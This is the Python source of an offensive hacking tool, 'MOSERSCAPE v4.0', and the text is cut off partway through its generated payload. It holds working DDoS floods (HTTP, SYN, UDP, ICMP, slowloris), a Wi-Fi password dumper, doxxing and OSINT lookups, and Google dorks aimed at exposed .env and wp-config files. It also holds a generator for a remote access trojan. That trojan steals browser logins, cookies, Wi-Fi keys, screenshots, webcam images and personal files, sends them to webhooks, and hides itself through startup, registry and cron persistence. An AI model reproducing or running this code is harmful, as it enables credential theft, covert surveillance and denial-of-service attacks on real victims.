#!/usr/bin/env python3

import os
import sys
import base64
import json
import datetime
import random
import string
import platform
import requests
import socket
import threading
import time
import subprocess
import re
import hashlib
import urllib.parse
import urllib.request
import ipaddress
import dns.resolver
import dns.reversename
import dns.zone
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from bs4 import BeautifulSoup
import whois
import paramiko
import ftplib
import sqlite3
import shutil
import cv2
import pyautogui
import psutil
import pynput
from pynput import keyboard
from PIL import Image, ImageGrab, ExifTags
import scapy.all as scapy
from scapy.layers import http
import cryptography
from cryptography.fernet import Fernet
from colorama import init, Fore, Style, Back
import webbrowser
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer

init(autoreset=True)

BLOOD_RED = '\033[38;2;139;0;0m'
DARK_RED = '\033[38;2;139;0;0m'
WHITE = '\033[38;2;255;255;255m'
RESET = '\033[0m'

GRADIENT = [
    '\033[38;2;255;255;255m',
    '\033[38;2;255;225;225m',
    '\033[38;2;255;195;195m',
    '\033[38;2;255;165;165m',
    '\033[38;2;255;135;135m',
    '\033[38;2;255;105;105m',
    '\033[38;2;255;75;75m',
    '\033[38;2;255;45;45m',
    '\033[38;2;255;15;15m',
    '\033[38;2;139;0;0m'
]

ASCII_ART = DARK_RED + """
░▒▓██████████████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░   
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░
                                                                                                                                
                    ╔════════════════════════════════════╗
                    ║          MOSERSCAPE v4.0           ║
                    ║     AI Code Generation Added       ║
                    ║          @shuukaid on tg           ║
                    ╚════════════════════════════════════╝
""" + RESET

CREDIT = DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + DARK_RED + "                      CREDIT: @shuukaid on tg\n" + DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + RESET

class CodeGenerator:
    def __init__(self):
        self.model = None
        self.tokenizer = None
        self.model_name = "microsoft/phi-2"  # Small but powerful model
        self.device = "cuda" if torch.cuda.is_available() else "cpu"
        
    def load_model(self):
        print(DARK_RED + f"[•] Loading AI model on {self.device}... (first time may take a few minutes)" + RESET)
        try:
            self.tokenizer = AutoTokenizer.from_pretrained(self.model_name, trust_remote_code=True)
            self.model = AutoModelForCausalLM.from_pretrained(
                self.model_name,
                torch_dtype=torch.float16 if self.device == "cuda" else torch.float32,
                trust_remote_code=True
            ).to(self.device)
            print(DARK_RED + "[+] AI model loaded successfully!" + RESET)
            return True
        except Exception as e:
            print(DARK_RED + f"[-] Failed to load model: {e}" + RESET)
            print(DARK_RED + "[!] Falling back to simpler model..." + RESET)
            try:
                self.model_name = "gpt2"
                self.tokenizer = AutoTokenizer.from_pretrained(self.model_name)
                self.model = AutoModelForCausalLM.from_pretrained(self.model_name).to(self.device)
                print(DARK_RED + "[+] GPT-2 model loaded successfully!" + RESET)
                return True
            except:
                return False
    
    def generate_code(self, prompt, max_length=500):
        if not self.model:
            if not self.load_model():
                return "Failed to load AI model. Please install transformers and torch."
        
        try:
            full_prompt = f"Write Python code for: {prompt}\n\n```python\n"
            inputs = self.tokenizer.encode(full_prompt, return_tensors="pt").to(self.device)
            
            with torch.no_grad():
                outputs = self.model.generate(
                    inputs,
                    max_length=max_length,
                    temperature=0.7,
                    do_sample=True,
                    pad_token_id=self.tokenizer.eos_token_id
                )
            
            generated = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
            
            # Extract just the code part
            if "```python" in generated:
                code = generated.split("```python")[1].split("```")[0]
            else:
                code = generated.replace(full_prompt, "")
            
            return code.strip()
        except Exception as e:
            return f"Error generating code: {e}"
    
    def gradient_progress(self, current, total):
        percent = current / total
        bar_length = 40
        filled = int(bar_length * percent)
        bar = ''
        for i in range(bar_length):
            if i < filled:
                idx = min(int((i / bar_length) * len(GRADIENT)), len(GRADIENT) - 1)
                bar += GRADIENT[idx] + '█' + RESET
            else:
                bar += '░'
        return f"[{bar}] {int(percent * 100)}%"

class Updater:
    def __init__(self):
        self.repo_url = "https://raw.githubusercontent.com/shuukaid/moserscape/main/"
        self.current_version = "4.0"
    
    def check_for_updates(self):
        try:
            r = requests.get(self.repo_url + "version.txt", timeout=5)
            if r.status_code == 200:
                latest_version = r.text.strip()
                return latest_version != self.current_version, latest_version
        except:
            pass
        return False, self.current_version
    
    def gradient_progress_bar(self, current, total, bar_length=50):
        percent = current / total
        filled_length = int(bar_length * percent)
        bar = ''
        for i in range(bar_length):
            if i < filled_length:
                gradient_index = min(int((i / bar_length) * len(GRADIENT)), len(GRADIENT) - 1)
                bar += GRADIENT[gradient_index] + '█' + RESET
            else:
                bar += '░'
        return f"[{bar}] {int(percent * 100)}%"
    
    def update(self):
        print(DARK_RED + "\n[•] Checking for updates..." + RESET)
        has_update, latest = self.check_for_updates()
        
        if not has_update:
            print(DARK_RED + "[+] You're already on the latest version!" + RESET)
            return False
        
        print(DARK_RED + f"[!] New version available: {latest}" + RESET)
        choice = input(DARK_RED + "[?] Update now? (y/n): " + RESET).lower()
        
        if choice != 'y':
            print(DARK_RED + "[-] Update cancelled" + RESET)
            return False
        
        files = [
            "moserscape.py",
            "requirements.txt",
            "README.md",
            "screenshot.png"
        ]
        
        print(DARK_RED + "\n[•] Downloading updates..." + RESET)
        
        for i, file in enumerate(files):
            try:
                r = requests.get(self.repo_url + file, timeout=5)
                if r.status_code == 200:
                    with open(file, 'wb') as f:
                        f.write(r.content)
                    
                    progress = self.gradient_progress_bar(i + 1, len(files))
                    sys.stdout.write(DARK_RED + f"\r{progress} - Updated {file}" + RESET)
                    sys.stdout.flush()
                time.sleep(0.5)
            except Exception as e:
                print(DARK_RED + f"\n[-] Failed to update {file}: {e}" + RESET)
        
        print(DARK_RED + "\n\n[+] Update complete! Please restart the tool." + RESET)
        return True

class Utils:
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_public_ip():
        try:
            return requests.get('https://api.ipify.org', timeout=3).text.strip()
        except:
            return "Unknown"
    
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_mac():
        try:
            import uuid
            return ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 8*6, 8)][::-1])
        except:
            return "Unknown"
    
    @staticmethod
    def get_wifi_passwords():
        passwords = []
        try:
            if platform.system() == "Windows":
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for profile in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
                        password_line = [b for b in results if "Key Content" in b]
                        if password_line:
                            password = password_line[0].split(":")[1].strip()
                            passwords.append(f"{profile}: {password}")
                        else:
                            passwords.append(f"{profile}: No password (open network)")
                    except:
                        passwords.append(f"{profile}: Error reading")
            elif platform.system() == "Linux":
                nm_path = "/etc/NetworkManager/system-connections/"
                if os.path.exists(nm_path):
                    for file in os.listdir(nm_path):
                        try:
                            with open(os.path.join(nm_path, file), 'r') as f:
                                content = f.read()
                                psk_match = re.search(r'psk=([^\n]+)', content)
                                if psk_match:
                                    passwords.append(f"{file}: {psk_match.group(1)}")
                        except:
                            pass
                
                wpa_path = "/etc/wpa_supplicant/wpa_supplicant.conf"
                if os.path.exists(wpa_path):
                    try:
                        with open(wpa_path, 'r') as f:
                            content = f.read()
                            ssids = re.findall(r'ssid="([^"]+)"', content)
                            psks = re.findall(r'psk="([^"]+)"', content)
                            for ssid, psk in zip(ssids, psks):
                                passwords.append(f"{ssid}: {psk}")
                    except:
                        pass
        except Exception as e:
            passwords.append(f"Error: {str(e)}")
        
        return passwords if passwords else ["No WiFi passwords found"]

class DDOSModule:
    def __init__(self):
        self.running = False
    
    def http_flood(self, url, duration=10, threads=100):
        print(DARK_RED + f"\n[•] HTTP Flood on {url} for {duration}s with {threads} threads\n" + RESET)
        self.running = True
        end_time = time.time() + duration
        successful = 0
        failed = 0
        
        def flood():
            nonlocal successful, failed
            while self.running and time.time() < end_time:
                try:
                    requests.get(url, timeout=1)
                    successful += 1
                except:
                    failed += 1
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        while time.time() < end_time:
            remaining = int(end_time - time.time())
            sys.stdout.write(DARK_RED + f"\r[•] Time: {remaining}s | Success: {successful} | Failed: {failed}" + RESET)
            sys.stdout.flush()
            time.sleep(1)
        
        self.running = False
        print(DARK_RED + f"\n\n[+] Attack finished - Total requests: {successful + failed}" + RESET)
    
    def syn_flood(self, target, port, duration=10):
        print(DARK_RED + f"\n[•] SYN Flood on {target}:{port} for {duration}s\n" + RESET)
        self.running = True
        end_time = time.time() + duration
        packets = 0
        
        def flood():
            nonlocal packets
            while self.running and time.time() < end_time:
                try:
                    ip = scapy.IP(src=Utils.get_local_ip(), dst=target)
                    syn = scapy.TCP(sport=random.randint(1024, 65535), dport=port, flags='S')
                    scapy.send(ip/syn, verbose=False)
                    packets += 1
                except:
                    pass
        
        thread_list = []
        for _ in range(50):
            t = threading.Thread(target=flood)
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        while time.time() < end_time:
            remaining = int(end_time - time.time())
            sys.stdout.write(DARK_RED + f"\r[•] Time: {remaining}s | Packets sent: {packets}" + RESET)
            sys.stdout.flush()
            time.sleep(1)
        
        self.running = False
        print(DARK_RED + f"\n\n[+] Attack finished - Total packets: {packets}" + RESET)
    
    def udp_flood(self, target, port, duration=10):
        print(DARK_RED + f"\n[•] UDP Flood on {target}:{port} for {duration}s\n" + RESET)
        self.running = True
        end_time = time.time() + duration
        packets = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and time.time() < end_time:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (target, port))
                packets += 1
                if packets % 100 == 0:
                    remaining = int(end_time - time.time())
                    sys.stdout.write(DARK_RED + f"\r[•] Time: {remaining}s | Packets: {packets}" + RESET)
                    sys.stdout.flush()
            except:
                pass
        
        sock.close()
        print(DARK_RED + f"\n\n[+] Attack finished - Total packets: {packets}" + RESET)
    
    def icmp_flood(self, target, duration=10):
        print(DARK_RED + f"\n[•] ICMP Flood on {target} for {duration}s\n" + RESET)
        self.running = True
        end_time = time.time() + duration
        packets = 0
        
        while self.running and time.time() < end_time:
            try:
                scapy.send(scapy.IP(dst=target)/scapy.ICMP(), verbose=False)
                packets += 1
                if packets % 100 == 0:
                    remaining = int(end_time - time.time())
                    sys.stdout.write(DARK_RED + f"\r[•] Time: {remaining}s | Packets: {packets}" + RESET)
                    sys.stdout.flush()
            except:
                pass
        
        print(DARK_RED + f"\n\n[+] Attack finished - Total packets: {packets}" + RESET)
    
    def slowloris(self, target, duration=10):
        print(DARK_RED + f"\n[•] Slowloris on {target} for {duration}s\n" + RESET)
        self.running = True
        end_time = time.time() + duration
        sockets = []
        
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, 80))
                s.send(b"GET / HTTP/1.1\r\n")
                sockets.append(s)
            except:
                pass
        
        while self.running and time.time() < end_time:
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")
                except:
                    sockets.remove(s)
            remaining = int(end_time - time.time())
            sys.stdout.write(DARK_RED + f"\r[•] Time: {remaining}s | Connections: {len(sockets)}" + RESET)
            sys.stdout.flush()
            time.sleep(10)
        
        for s in sockets:
            s.close()
        print(DARK_RED + f"\n\n[+] Attack finished" + RESET)

class OSINTModule:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    def google_search(self, query):
        search_url = f"https://www.google.com/search?q={urllib.parse.quote(query)}"
        print(DARK_RED + f"[+] Opening: {search_url}" + RESET)
        webbrowser.open(search_url)
        return search_url
    
    def google_dork(self, query):
        dorks = [
            f"site:github.com {query}",
            f"site:pastebin.com {query}",
            f"site:trello.com {query}",
            f"site:docs.google.com {query}",
            f"site:drive.google.com {query}",
            f"filetype:pdf {query}",
            f"filetype:doc {query}",
            f"filetype:xls {query}",
            f"filetype:txt {query}",
            f"filetype:sql {query}",
            f"filetype:log {query}",
            f"filetype:env {query}",
            f"filetype:bak {query}",
            f"intitle:\"index of\" {query}",
            f"inurl:wp-config.php {query}",
            f"inurl:.env {query}",
            f"inurl:backup {query}",
            f"inurl:phpinfo.php {query}",
        ]
        print(DARK_RED + f"\n[•] Google Dorks for '{query}':\n" + RESET)
        for i, d in enumerate(dorks, 1):
            url = f"https://www.google.com/search?q={urllib.parse.quote(d)}"
            print(DARK_RED + f"{i}. {d}" + RESET)
            print(DARK_RED + f"   {url}\n" + RESET)
        return dorks
    
    def username_lookup(self, username):
        sites = [
            ("GitHub", f"https://github.com/{username}"),
            ("Reddit", f"https://www.reddit.com/user/{username}"),
            ("Twitter", f"https://twitter.com/{username}"),
            ("Instagram", f"https://www.instagram.com/{username}/"),
            ("TikTok", f"https://www.tiktok.com/@{username}"),
            ("YouTube", f"https://www.youtube.com/@{username}"),
            ("Steam", f"https://steamcommunity.com/id/{username}"),
            ("Twitch", f"https://www.twitch.tv/{username}"),
            ("Pinterest", f"https://www.pinterest.com/{username}/"),
            ("Telegram", f"https://t.me/{username}"),
            ("Snapchat", f"https://www.snapchat.com/add/{username}"),
            ("Medium", f"https://medium.com/@{username}"),
            ("Spotify", f"https://open.spotify.com/user/{username}"),
            ("GitLab", f"https://gitlab.com/{username}"),
            ("LinkedIn", f"https://www.linkedin.com/in/{username}"),
            ("Facebook", f"https://www.facebook.com/{username}"),
            ("VK", f"https://vk.com/{username}"),
        ]
        
        print(DARK_RED + f"\n[•] Searching for {username}...\n" + RESET)
        found = []
        for site, url in sites:
            try:
                r = self.session.get(url, timeout=2, allow_redirects=True)
                if r.status_code == 200:
                    print(DARK_RED + f"[+] {site}: {url}" + RESET)
                    found.append(url)
            except:
                pass
        return found
    
    def email_lookup(self, email):
        print(DARK_RED + f"\n[•] Looking up {email}\n" + RESET)
        results = {}
        domain = email.split('@')[1]
        
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            results['mx'] = [str(r.exchange) for r in answers]
            print(DARK_RED + f"[+] MX Records: {', '.join(results['mx'])}" + RESET)
        except:
            print(DARK_RED + "[-] No MX records" + RESET)
        
        hash = hashlib.md5(email.lower().encode()).hexdigest()
        gravatar = f"https://www.gravatar.com/avatar/{hash}"
        r = requests.get(gravatar)
        if r.status_code == 200:
            results['gravatar'] = gravatar
            print(DARK_RED + f"[+] Gravatar: {gravatar}" + RESET)
        
        try:
            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
            if r.status_code == 200:
                results['breached'] = True
                print(DARK_RED + "[+] Email found in breaches!" + RESET)
        except:
            pass
        
        return results
    
    def phone_lookup(self, phone):
        print(DARK_RED + f"\n[•] Looking up {phone}\n" + RESET)
        try:
            num = phonenumbers.parse(phone, None)
            if phonenumbers.is_valid_number(num):
                country = geocoder.description_for_number(num, "en")
                carrier_name = carrier.name_for_number(num, "en")
                timezones = timezone.time_zones_for_number(num)
                national = phonenumbers.format_number(num, phonenumbers.PhoneNumberFormat.NATIONAL)
                international = phonenumbers.format_number(num, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                
                print(DARK_RED + f"[+] Country: {country}" + RESET)
                print(DARK_RED + f"[+] Carrier: {carrier_name}" + RESET)
                print(DARK_RED + f"[+] Timezone: {', '.join(timezones)}" + RESET)
                print(DARK_RED + f"[+] National: {national}" + RESET)
                print(DARK_RED + f"[+] International: {international}" + RESET)
                
                return {
                    "country": country,
                    "carrier": carrier_name,
                    "timezones": list(timezones),
                    "national": national,
                    "international": international
                }
            else:
                print(DARK_RED + "[-] Invalid phone number" + RESET)
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
        return None
    
    def ip_lookup(self, ip):
        print(DARK_RED + f"\n[•] Looking up {ip}\n" + RESET)
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
            data = r.json()
            if data.get('status') == 'success':
                print(DARK_RED + f"[+] IP: {data.get('query')}" + RESET)
                print(DARK_RED + f"[+] Country: {data.get('country')} ({data.get('countryCode')})" + RESET)
                print(DARK_RED + f"[+] Region: {data.get('regionName')}" + RESET)
                print(DARK_RED + f"[+] City: {data.get('city')}" + RESET)
                print(DARK_RED + f"[+] ZIP: {data.get('zip')}" + RESET)
                print(DARK_RED + f"[+] Coordinates: {data.get('lat')}, {data.get('lon')}" + RESET)
                print(DARK_RED + f"[+] ISP: {data.get('isp')}" + RESET)
                print(DARK_RED + f"[+] Organization: {data.get('org')}" + RESET)
                print(DARK_RED + f"[+] ASN: {data.get('as')}" + RESET)
                print(DARK_RED + f"[+] Proxy: {data.get('proxy')}" + RESET)
                return data
            else:
                print(DARK_RED + f"[-] Error: {data.get('message')}" + RESET)
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
        return None
    
    def dns_lookup(self, domain):
        print(DARK_RED + f"\n[•] DNS Lookup for {domain}\n" + RESET)
        types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR']
        for t in types:
            try:
                answers = dns.resolver.resolve(domain, t)
                print(DARK_RED + f"[+] {t} Records:" + RESET)
                for r in answers:
                    print(DARK_RED + f"    {r}" + RESET)
            except:
                pass
    
    def port_scan(self, target, start=1, end=1000):
        print(DARK_RED + f"\n[•] Scanning {target} from port {start} to {end}\n" + RESET)
        open_ports = []
        
        def scan_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports.append(f"{port}/{service}")
                    print(DARK_RED + f"[+] Port {port} open: {service}" + RESET)
                s.close()
            except:
                pass
        
        threads = []
        for port in range(start, end+1):
            t = threading.Thread(target=scan_port, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
            if len(threads) >= 200:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        print(DARK_RED + f"\n[+] Found {len(open_ports)} open ports" + RESET)
        return open_ports
    
    def subdomain_enum(self, domain):
        print(DARK_RED + f"\n[•] Enumerating subdomains for {domain}\n" + RESET)
        common = ['www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'cpanel', 'admin', 'blog', 'dev', 'test', 'api', 'app', 'shop', 'secure', 'vpn', 'support', 'docs', 'beta', 'stage', 'staging', 'prod', 'backup', 'db', 'mysql', 'cloud', 'cdn', 'static', 'media', 'images', 'img', 'css', 'js', 'assets', 'download', 'files', 'upload']
        found = []
        
        for sub in common:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(DARK_RED + f"[+] {subdomain} -> {ip}" + RESET)
                found.append(f"{subdomain} -> {ip}")
            except:
                pass
        
        print(DARK_RED + f"\n[+] Found {len(found)} subdomains" + RESET)
        return found
    
    def whois_lookup(self, domain):
        print(DARK_RED + f"\n[•] WHOIS Lookup for {domain}\n" + RESET)
        try:
            w = whois.whois(domain)
            for key, value in w.items():
                if value:
                    print(DARK_RED + f"[+] {key}: {value}" + RESET)
            return w
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
            return None
    
    def pastebin_search(self, query):
        print(DARK_RED + f"\n[•] Searching Pastebin for '{query}'\n" + RESET)
        try:
            r = requests.get(f"https://psbdmp.ws/api/search/{query}", timeout=5)
            if r.status_code == 200:
                data = r.json().get('data', [])
                print(DARK_RED + f"[+] Found {len(data)} results" + RESET)
                for item in data[:10]:
                    print(DARK_RED + f"[+] https://pastebin.com/{item.get('id')}" + RESET)
                return data
        except:
            print(DARK_RED + "[-] Search failed" + RESET)
        return None
    
    def reverse_image(self, path):
        print(DARK_RED + f"\n[•] Reverse image search for {path}\n" + RESET)
        try:
            if not os.path.exists(path):
                print(DARK_RED + "[-] File not found" + RESET)
                return None
            with open(path, 'rb') as f:
                files = {'encoded_image': f}
                r = requests.post('https://www.google.com/searchbyimage/upload', files=files)
                if r.status_code == 200:
                    print(DARK_RED + f"[+] Search URL: {r.url}" + RESET)
                    return r.url
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
        return None
    
    def metadata_extract(self, path):
        print(DARK_RED + f"\n[•] Extracting metadata from {path}\n" + RESET)
        try:
            if not os.path.exists(path):
                print(DARK_RED + "[-] File not found" + RESET)
                return None
            img = Image.open(path)
            exif = img.getexif()
            if not exif:
                print(DARK_RED + "[-] No metadata found" + RESET)
                return None
            
            for tag_id, value in exif.items():
                tag = ExifTags.TAGS.get(tag_id, tag_id)
                if isinstance(value, bytes):
                    value = value.decode(errors='ignore')
                print(DARK_RED + f"[+] {tag}: {value}" + RESET)
            return dict(exif)
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
        return None
    
    def breach_check(self, email):
        print(DARK_RED + f"\n[•] Checking breaches for {email}\n" + RESET)
        try:
            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
            if r.status_code == 200:
                data = r.json()
                print(DARK_RED + f"[+] Found in {len(data)} breaches" + RESET)
                for breach in data:
                    print(DARK_RED + f"[+] {breach.get('Name')} - {breach.get('BreachDate')}" + RESET)
                return data
            else:
                print(DARK_RED + "[-] No breaches found" + RESET)
        except:
            print(DARK_RED + "[-] Check failed" + RESET)
        return None
    
    def wayback(self, url):
        print(DARK_RED + f"\n[•] Wayback Machine for {url}\n" + RESET)
        try:
            r = requests.get(f"http://archive.org/wayback/available?url={url}")
            data = r.json().get('archived_snapshots', {})
            if data:
                closest = data.get('closest', {})
                print(DARK_RED + f"[+] Snapshot: {closest.get('url')}" + RESET)
                print(DARK_RED + f"[+] Timestamp: {closest.get('timestamp')}" + RESET)
            else:
                print(DARK_RED + "[-] No snapshots found" + RESET)
            return data
        except:
            print(DARK_RED + "[-] Wayback lookup failed" + RESET)
        return None

class PayloadGenerator:
    def __init__(self):
        self.webhooks = []
    
    def add_webhook(self, url):
        self.webhooks.append(url)
        print(DARK_RED + f"[+] Webhook added. Total: {len(self.webhooks)}" + RESET)
    
    def clear_webhooks(self):
        self.webhooks = []
        print(DARK_RED + "[+] All webhooks cleared" + RESET)
    
    def generate_full_rat(self, name="full_rat.py"):
        hooks = json.dumps(self.webhooks)
        code = f'''#!/usr/bin/env python3
import os,sys,platform,socket,uuid,json,datetime,subprocess,getpass,requests,threading,time,shutil,sqlite3,cv2,pyautogui,psutil
from pathlib import Path

webhooks = {hooks}
SLEEP = 30

def send(data, file=None):
    for hook in webhooks:
        try:
            if file and os.path.exists(file):
                with open(file, 'rb') as f:
                    requests.post(hook, files={{"file": (os.path.basename(file), f)}}, timeout=5)
            else:
                if len(data) > 1900:
                    for i in range(0, len(data), 1900):
                        requests.post(hook, json={{"content": data[i:i+1900]}}, timeout=3)
                else:
                    requests.post(hook, json={{"content": data}}, timeout=3)
        except:
            pass

def get_info():
    i = {{
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.architecture()[0],
        "cpu": os.cpu_count(),
        "user": getpass.getuser(),
        "home": str(Path.home()),
        "cwd": os.getcwd(),
        "uuid": str(uuid.uuid4()),
        "mac": ':'.join(['{{:02x}}'.format((uuid.getnode()>>e)&0xff) for e in range(0,2*6,2)][::-1]),
        "time": datetime.datetime.now().isoformat(),
        "boot": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        "mem": str(psutil.virtual_memory().percent) + "%",
        "disk": str(psutil.disk_usage('/').percent) + "%",
        "ip_local": "unknown",
        "ip_public": "unknown"
    }}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        i["ip_local"] = s.getsockname()[0]
        s.close()
    except:
        pass
    try:
        i["ip_public"] = requests.get('https://api.ipify.org', timeout=3).text.strip()
    except:
        pass
    return i

def steal_wifi():
    if platform.system() != "Windows":
        return ""
    result = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        for line in profiles.split('\\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                try:
                    data = subprocess.check_output(f'netsh wlan show profile "{{profile}}" key=clear', shell=True, text=True)
                    result += f"SSID: {{profile}}\\n"
                    for l in data.split('\\n'):
                        if "Key Content" in l:
                            result += f"Pass: {{l.split(':')[1].strip()}}\\n\\n"
                except:
                    pass
    except:
        pass
    return result

def screenshot():
    try:
        img = pyautogui.screenshot()
        path = f"ss_{{int(time.time())}}.png"
        img.save(path)
        return path
    except:
        return None

def webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            path = f"cam_{{int(time.time())}}.jpg"
            cv2.imwrite(path, frame)
            cam.release()
            return path
        cam.release()
    except:
        pass
    return None

def steal_browsers():
    if platform.system() != "Windows":
        return []
    results = []
    browsers = {{
        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),
        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),
        "Brave": os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default")
    }}
    for name, path in browsers.items():
        if os.path.exists(path):
            login = os.path.join(path, "Login Data")
            if os.path.exists(login):
                dst = f"{{name}}_login_{{int(time.time())}}.db"
                try:
                    shutil.copy2(login, dst)
                    results.append(dst)
                except:
                    pass
            cookies = os.path.join(path, "Cookies")
            if os.path.exists(cookies):
                dst = f"{{name}}_cookies_{{int(time.time())}}.db"
                try:
                    shutil.copy2(cookies, dst)
                    results.append(dst)
                except:
                    pass
    return results

def steal_files():
    files = []
    targets = [str(Path.home()/"Desktop"), str(Path.home()/"Documents"), str(Path.home()/"Downloads")]
    exts = ('.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.jpg', '.png', '.kdbx', '.wallet', '.key', '.ovpn')
    for target in targets:
        if os.path.exists(target):
            for f in os.listdir(target)[:10]:
                path = os.path.join(target, f)
                if os.path.isfile(path) and f.endswith(exts):
                    files.append(path)
    return files

def persist():
    try:
        current = sys.executable if getattr(sys, 'frozen', False) else __file__
        if platform.system() == "Windows":
            startup = os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            if os.path.exists(startup):
                dest = os.path.join(startup, "svchost.py")
                shutil.copy2(current, dest)
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                        winreg.SetValueEx(reg, "WindowsService", 0, winreg.REG_SZ, dest)
                except:
                    pass
        else:
            cron = f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1"
            try:
                cur = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
                with open("/tmp/cron.tmp", "w") as f:
                    f.write(cur + cron + "\\n")
                subprocess.run(["crontab", "/tmp/cron.tmp"])
                os.remove("/tmp/cron.tmp")
            except:
                pass
